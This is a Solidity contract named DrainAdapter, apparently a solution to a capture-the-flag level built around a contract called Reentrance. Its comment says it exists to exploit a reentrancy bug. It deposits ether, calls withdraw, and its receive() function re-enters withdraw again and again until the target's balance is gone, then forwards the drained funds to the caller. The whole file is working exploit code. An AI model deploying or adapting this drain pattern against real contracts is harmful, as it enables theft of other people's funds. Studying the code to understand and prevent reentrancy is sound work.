// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '@openzeppelin/contracts/utils/math/SafeMath.sol';
import './Reentrance.sol';

//DEBUG
import 'hardhat/console.sol';

contract DrainAdapter {
  // contract designed to exploit Re-entrancy bug 
  using SafeMath for uint256;
  Reentrance reentrance;
  uint batchSize;
  address payable withdrawer;

  event Heist(address withdrawer, uint bounty);

  function donateToSelf(address payable _reentrance) public payable {
    require(msg.value > 0);
    reentrance = Reentrance(_reentrance);
    batchSize = msg.value;
    withdrawer = payable(msg.sender);
    reentrance.donate{value: msg.value}(address(this));
    reentrance.withdraw(batchSize);
  }


  receive() external payable {
    // gives the withdraw a little twist
    if (address(reentrance).balance >= batchSize) {
      reentrance.withdraw(batchSize);
    } else {
      uint bounty = address(this).balance;
      if (withdrawer.send(bounty)) {
        console.log("Sending %s to %s", bounty, withdrawer);
      }
    }
  }
}
